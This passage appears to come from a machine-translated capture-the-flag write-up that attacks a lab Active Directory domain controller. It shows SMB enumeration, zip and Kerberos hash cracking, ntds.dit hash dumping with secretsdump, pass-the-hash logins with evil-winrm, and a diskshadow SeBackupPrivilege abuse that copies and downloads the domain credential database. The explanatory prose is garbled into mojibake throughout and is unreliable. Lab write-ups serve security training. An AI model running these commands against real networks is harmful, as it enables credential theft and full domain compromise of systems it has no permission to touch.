sbradley</span></pre><p id="df76" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ç°åœ¨å¯ä»¥ä½¿ç”¨ç”¨æˆ·â€œ<strong class="jw ir"><em class="kt">SBR adley</em></strong>â€<strong class="jw ir"/>çš„æ–°é‡ç½®å‡­æ®æ¥è¿›ä¸€æ­¥æšä¸¾SMBå…±äº«ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c312" class="mn lc iq mj b gy mo mp l mq mr">smbmap -H 10.10.127.15 -u sbradley -p password<br/>                                  <br/>Disk                     Permissions     Comment<br/>----                     -----------     -------<br/>ADMIN$                   NO ACCESS       Remote Admin<br/>C$                       NO ACCESS       Default share<br/>IPC$                     READ ONLY       Remote IPC<br/>NETLOGON                 READ ONLY       Logon server share <br/>SYSVOL                   READ ONLY       Logon server share <br/>trash                    <strong class="mj ir">READ ONLY</strong>       Files Pending for deletion</span></pre><p id="fd8b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘çœ‹åˆ°æˆ‘ç°åœ¨å¯¹åä¸º<strong class="jw ir"> trash </strong>çš„SMBå…±äº«æ‹¥æœ‰åªè¯»è®¿é—®æƒé™ã€‚æŸ¥çœ‹å…±äº«çš„å†…å®¹ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ–‡ä»¶ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="caa4" class="mn lc iq mj b gy mo mp l mq mr">smbclient //10.10.127.15/trash -U sbradley <br/><br/>smb: \&gt; ls<br/><br/>chat_log_20210222143423.txt     A     1340  Thu Feb 25 19:29:05 2021<br/>experiment_gone_wrong.zip       A 18927164  Tue Mar 16 06:02:20 2021<br/>sbradley.txt                    A       37  Sat Feb 27 19:24:21 2021</span></pre><p id="6146" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æŸ¥çœ‹â€œ<em class="kt">chat _ log _ 20210222143423 . txt</em>â€æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°<strong class="jw ir">CVE-2020â€“1472</strong>(å³ZeroLogon)è¢«æåŠã€‚ç”¨æˆ·"<em class="kt"> sbradley </em>"ä¼¼ä¹ä¹Ÿåˆ¶ä½œäº†ä¸€ä¸ªåŒ…å«<strong class="jw ir"> ntds.dit </strong>å’Œ<strong class="jw ir"> SYSTEM.hive </strong>æ–‡ä»¶çš„åŠ å¯†zipï¼Œç„¶åç®¡ç†å‘˜æ’¤é”€äº†ä»–ä»¬çš„WinRM-Accessã€‚æˆ‘ç”¨<strong class="jw ir"> fcrackzip </strong>æ‰¾åˆ°äº†å¸¦æœ‰â€œ<em class="kt"> rockyou.txt </em>å•è¯è¡¨çš„åŠ å¯†zipæ–‡ä»¶çš„å¯†ç ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="cd8a" class="mn lc iq mj b gy mo mp l mq mr">fcrackzip -u -D -p ~/rockyou.txt experiment_gone_wrong.zip</span><span id="ff47" class="mn lc iq mj b gy ms mp l mq mr">PASSWORD FOUND!!!!: pw == electro......</span></pre><p id="18ad" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘æå–äº†<strong class="jw ir"> ntds.dit </strong>å’Œ<strong class="jw ir"> SYSTEM.hive </strong>æ–‡ä»¶ï¼Œç„¶åæˆ‘ä½¿ç”¨äº†â€œ<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>â€æ¥æå–å¯†ç å“ˆå¸Œã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="ccf4" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 secretsdump.py -system system.hive -ntds ntds.dit LOCAL</span></pre><p id="f816" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™ç»™äº†æˆ‘ä¸€ä¸ªå¾ˆé•¿çš„æ½œåœ¨æ•£åˆ—åˆ—è¡¨ã€‚æˆ‘ä½¿ç”¨<strong class="jw ir"> cut </strong>å‘½ä»¤ä»"<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>"çš„è¾“å‡ºä¸­æå–å®é™…çš„æ•£åˆ—ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="2f45" class="mn lc iq mj b gy mo mp l mq mr">cat hashes | cut -d ':' -f 4</span></pre><p id="2a5c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨<strong class="jw ir"> crackmapexec </strong>æ¥ä¸ºç”¨æˆ·<strong class="jw ir">lvert ova</strong>è¯†åˆ«æ•£åˆ—ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="08e4" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.105.22 -u lvetrova -H userhashes</span><span id="259c" class="mn lc iq mj b gy ms mp l mq mr">[+] raz0rblack.thm\lvetrova:f220d3988deb**************</span></pre><p id="eefe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">ç°åœ¨æˆ‘ä»¬æœ‰äº†ç”¨æˆ·çš„æ•£åˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong class="jw ir"> evil-winrm </strong>æ¥æ‰§è¡Œä¸€ä¸ªä¼ é€’æ•£åˆ—æ”»å‡»æ¥ç™»å½•ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3f17" class="mn lc iq mj b gy mo mp l mq mr">evil-winrm -u lvetrova -H f220d3988deb3f***** -i 10.10.105.22 -N</span></pre><p id="aa4e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç›®æ ‡ï¼Œæ‰¾åˆ°ä¸€ä¸ªåä¸º<strong class="jw ir"><em class="kt">â€œlvetrova . xml</em>â€</strong>çš„XMLæ–‡ä»¶ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c544" class="mn lc iq mj b gy mo mp l mq mr">*Evil-WinRM* PS C:\Users\lvetrova&gt; dir</span><span id="f99b" class="mn lc iq mj b gy ms mp l mq mr">Directory: C:\Users\lvetrova</span><span id="3d03" class="mn lc iq mj b gy ms mp l mq mr">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-r---        9/15/2018  12:19 AM                Desktop<br/>d-r---        2/25/2021  10:14 AM                Documents<br/>d-r---        9/15/2018  12:19 AM                Downloads<br/>d-r---        9/15/2018  12:19 AM                Favorites<br/>d-r---        9/15/2018  12:19 AM                Links<br/>d-r---        9/15/2018  12:19 AM                Music<br/>d-r---        9/15/2018  12:19 AM                Pictures<br/>d-----        9/15/2018  12:19 AM                Saved Games<br/>d-r---        9/15/2018  12:19 AM                Videos<br/><strong class="mj ir">-a----        2/25/2021  10:16 AM           1692 lvetrova.xml</strong></span></pre><p id="788a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä½¿ç”¨äº†<strong class="jw ir"> type </strong>å‘½ä»¤æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªPSCredential PowerShell xmlæ–‡ä»¶ã€‚PSCredentialå¯¹è±¡<strong class="jw ir">è¡¨ç¤ºä¸€ç»„å®‰å…¨å‡­è¯ï¼Œæ¯”å¦‚ç”¨æˆ·åå’Œå¯†ç </strong>ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nm"><img src="../Images/1ef5d7e75babd253a097c6e3badbc4d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ymoDKJG4b2RlHqanINFrQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">PSCredential PowerShell xmlæ–‡ä»¶ã€‚</figcaption></figure><p id="dc11" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a class="ae ks" href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" rel="noopener ugc nofollow" target="_blank"> PowerShell </a>è¯»å–xmlæ–‡ä»¶ä¸­å­˜å‚¨çš„æ ‡å¿—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nr"><img src="../Images/5142201ea171b7e622a685873b084b40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FrLzejEPFcHWK90YG7RWcQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">æŸ³å¾·ç±³æ‹‰çš„æ——å¸œã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f28d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberoasting</h1><p id="777b" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">å› ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„æ•£åˆ—ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥å¯»æ‰¾æ”¯æŒçš„SPNï¼Œå¹¶ä½¿ç”¨Impacketä¸­çš„â€œ<strong class="jw ir"> <em class="kt"> GetUserSPNs.py </em> </strong>â€å·¥å…·è·å¾—SPNçš„TGSç¥¨ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7f57" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 GetUserSPNs.py -dc-ip 10.10.32.193 raz0rblack.thm/lvetrova -hashes f220d3988deb3******:f220d3988deb3***** -request</span></pre><p id="a78e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™æˆåŠŸåœ°ä¸ºç”¨æˆ·â€œ<strong class="jw ir"> <em class="kt"> xyan1d3 </em> </strong>â€æä¾›äº†ä¸€ä¸ªTGSæ•£åˆ—ï¼Œç°åœ¨æˆ‘å¯ä»¥ä½¿ç”¨<strong class="jw ir"> hashcat </strong>æ¥è·å–å¯†ç ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="66c2" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 13100 hash.txt rockyou.txt</span></pre><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi ns"><img src="../Images/1bf12e7e4d04ef6933977af980237799.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pdPBdexJ0B_BHc4GnoX-fw.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">ç ´è§£å“ˆå¸Œã€‚</figcaption></figure><p id="2430" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨å¸¦æœ‰<strong class="jw ir"> evil-winrm </strong>çš„å‡­è¯ç™»å½•ã€‚ç™»å½•åï¼Œæˆ‘å‘ç°äº†å¦ä¸€ä¸ªPSCredential PowerShell xmlæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«è¯¥æ ‡å¿—ï¼Œå°½ç®¡å£°æ˜ä¸æ˜¯è¿™æ ·ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nt"><img src="../Images/89c2c373a804c3ec3ac9918d6506abd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zkHcgBZtjFcad8Acf6TYqQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">Xyan1d3çš„æ ‡å¿—ã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="d60c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æƒé™æå‡</h1><p id="dc99" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘é¦–å…ˆä½¿ç”¨<strong class="jw ir"> whoami </strong>æ‰§è¡Œä¸€äº›æ‰‹åŠ¨ç”¨æˆ·æšä¸¾ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="fbc1" class="mn lc iq mj b gy mo mp l mq mr">whoami /all</span><span id="9b34" class="mn lc iq mj b gy ms mp l mq mr">Group Name                                 Type<br/>========================================== ================<br/>Everyone                                   Well-known group<br/><strong class="mj ir">BUILTIN\Backup Operators</strong>                   Alias<br/>BUILTIN\Remote Management Users            Alias<br/>BUILTIN\Users                              Alias<br/>......<br/></span><span id="97dc" class="mn lc iq mj b gy ms mp l mq mr">PRIVILEGES INFORMATION<br/>----------------------</span><span id="fab6" class="mn lc iq mj b gy ms mp l mq mr">Privilege Name                Description<br/>============================= ==============================<br/>SeMachineAccountPrivilege     Add workstations to domain<br/><strong class="mj ir">SeBackupPrivilege             Back up files and directories</strong><br/><strong class="mj ir">SeRestorePrivilege            Restore files and directories</strong><br/>SeShutdownPrivilege           Shut down the system<br/>SeChangeNotifyPrivilege       Bypass traverse checking<br/>SeIncreaseWorkingSetPrivilege Increase a process working set</span></pre><p id="b9a9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">é€šè¿‡ä½¿ç”¨<strong class="jw ir"><em class="kt">â€œwhoami/allâ€ã€</em> </strong>æŸ¥çœ‹ç”¨æˆ·çš„æƒé™ï¼Œæˆ‘çœ‹åˆ°è¯¥ç”¨æˆ·å±äº<strong class="jw ir">å¤‡ä»½æ“ä½œå‘˜</strong>ç»„ï¼Œè¯¥ç»„å¯ç”¨äº†<strong class="jw ir"> SeBackupPrivilege </strong>å’Œ<strong class="jw ir"> SeRestorePrivilege </strong>ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§æŠ€æœ¯æ¥åˆ©ç”¨ï¼Œæ¯”å¦‚ä½¿ç”¨<a class="ae ks" href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" rel="noopener"> DiskShadow </a>ã€‚ä¸‹é¢æ˜¯ç”¨æ¥è·å–æ–‡ä»¶çš„è„šæœ¬ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c46c" class="mn lc iq mj b gy mo mp l mq mr">set metadata C:\tmp\tmp.cabs <br/>set context persistent nowriters <br/>add volume c: alias someAlias <br/>create <br/>expose %someAlias% h:</span></pre><p id="1a61" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä¸Šä¼ äº†æ–‡æœ¬æ–‡ä»¶å¹¶æ‰§è¡Œäº†ä¸‹é¢çš„å‘½ä»¤ï¼Œå¦‚ä¸Šé¢é“¾æ¥çš„æ–‡ç« æ‰€è¿°ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7671" class="mn lc iq mj b gy mo mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; upload back_script.txt</span><span id="b36c" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; mkdir C:\tmp</span><span id="725f" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; diskshadow /s back_script.txt</span><span id="74fc" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\tmp&gt; upload SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; upload SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite</span><span id="04b0" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\temp&gt; reg save hklm\system c:\temp\system</span><span id="3e60" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\temp&gt; download ntds.dit<br/>*Evil-WinRM* PS C:\temp&gt; download system</span></pre><p id="6b68" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">ä¸€æ—¦æˆ‘æœ‰äº†<strong class="jw ir"> ntds.dit </strong>å’Œ<strong class="jw ir">ç³»ç»Ÿ</strong>æ–‡ä»¶ï¼Œæˆ‘å°±å¯ä»¥ä½¿ç”¨â€œ<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>â€æ¥æ£€ç´¢æ•£åˆ—ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7dc6" class="mn lc iq mj b gy mo mp l mq mr">python3 secretsdump.py -system system -ntds ntds.dit LOCAL</span></pre><p id="7a02" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™ä¸ºç®¡ç†å‘˜çš„å¸æˆ·æä¾›äº†æ•£åˆ—ã€‚æˆ‘ç°åœ¨å¯ä»¥ä½¿ç”¨<strong class="jw ir"> evil-winrm </strong>ä½œä¸ºç®¡ç†å‘˜ç™»å½•ã€‚æˆ‘å¯ä»¥çœ‹åˆ°å¸¦æœ‰æ ‡å¿—çš„PS credential PowerShell "<strong class="jw ir"><em class="kt">root . XML</em></strong>"æ–‡ä»¶ï¼Œä½†åœ¨å°è¯•è¯»å–è¯¥æ–‡ä»¶æ—¶å‡ºç°é”™è¯¯ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nu"><img src="../Images/34c8b05318bd79e8186d5bad10d1d90b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UfvbEPMEu5FaQsdRm02oPA.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">PSCredential PowerShellé”™è¯¯ã€‚</figcaption></figure><p id="b4c5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æŸ¥çœ‹â€œ<strong class="jw ir"> <em class="kt"> root.xml </em> </strong>â€çš„å†…å®¹ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç¼–ç çš„æ ‡å¿—ã€‚ä½¿ç”¨CyberChefï¼Œæˆ‘å¯ä»¥çœ‹åˆ°è¯¥æ–‡ä»¶çš„æ ‡å¿—æ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œè§£ç å®ƒç»™æˆ‘çš„æ ‡å¿—ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/adcc1a4e04fdeb74229156033f2c1a14.png" data-original-src="https://miro.medium.com/v2/resize:fit:1050/format:webp/1*IAnLx9XVpgV6utcswRmqLg.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">æ ¹æ ‡å¿—ã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="ead7" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ³°æ£®çš„æ——å¸œ</h1><p id="40fe" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å¼€å§‹æ‰¾æ³°æ£®çš„æ——å¸œï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªåä¸ºâ€œ<strong class="jw ir"> <em class="kt"> twilliams </em> </strong>â€çš„ç”¨æˆ·æ–‡ä»¶å¤¹ã€‚åœ¨æ–‡ä»¶å¤¹é‡Œï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªå¯ç–‘çš„æ–‡ä»¶:</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3b5c" class="mn lc iq mj b gy mo mp l mq mr">definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe</span></pre><p id="aefd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ£€æŸ¥è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ç»™äº†æˆ‘ä¸€ä¸ªæ ‡å¿—ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nw"><img src="../Images/a5bbf114ff16fa355a58949d9f046a53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J88gqN6xbsNQecWj5PsZgw.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">æ³°æ£®æ——å¸œã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="c5ef" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç»å¯¹æœºå¯†çš„</h1><p id="b0a0" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">è¿™ä¸ªæˆ¿é—´çš„æœ€ç»ˆä»»åŠ¡æ˜¯æ‰¾åˆ°è—åœ¨æœºå™¨ä¸Šçš„æœ€é«˜æœºå¯†ã€‚æ‰§è¡Œä¸€äº›æ‰‹åŠ¨æšä¸¾ï¼Œæˆ‘åœ¨â€œ<strong class="jw ir"><em class="kt"/></strong>â€ç¨‹åºæ–‡ä»¶ä¸‹æ‰¾åˆ°ä¸€ä¸ªåä¸ºâ€œ<strong class="jw ir"> <em class="kt">ç»å¯†</em> </strong>çš„æ–‡ä»¶å¤¹ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="afc1" class="mn lc iq mj b gy mo mp l mq mr">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-----        5/21/2021  11:45 AM                Amazon<br/>d-----        2/23/2021   6:27 AM                Common Files<br/>d-----        5/21/2021   9:39 AM                internet explorer<br/><strong class="mj ir">d-----        2/25/2021  10:13 AM                Top Secret</strong><br/>d-----        5/21/2021  11:41 AM                VMware</span></pre><p id="95ff" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾åƒæ–‡ä»¶å­˜å‚¨åœ¨åä¸ºâ€œ<strong class="jw ir"> <em class="kt"> top_secret.png </em> </strong>â€çš„æ–‡ä»¶å¤¹ä¸­ã€‚æˆ‘ä¸‹è½½äº†å›¾åƒå¹¶æ‰“å¼€äº†å®ƒã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/be0ff2e16ae39895a81307b408598b52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*Y6MiyXudrPNAn7fi44peZw.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">ç»å¯†. png</figcaption></figure><p id="c78f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ ¹æ®å›¾åƒï¼Œä¼¼ä¹æœ€é«˜æœºå¯†æ˜¯ç”¨äºé€€å‡ºVIMçš„å®Œæ•´å‘½ä»¤ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8020" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æœ€åçš„æƒ³æ³•</h1><p id="f369" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œï¼Œå¹¶æœ‰æœºä¼šå­¦ä¹ æ›´å¤šå…³äºåˆ©ç”¨Active DirectoryåŸŸæ§åˆ¶å™¨çš„çŸ¥è¯†ã€‚è¿™ä¸ªæŒ‘æˆ˜æœ‰å¾ˆå¤šæšä¸¾ï¼Œè¿™å¸®åŠ©æˆ‘æé«˜äº†æˆ‘çš„Active Directoryæšä¸¾æŠ€èƒ½ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p></div></div>    
</body>
</html>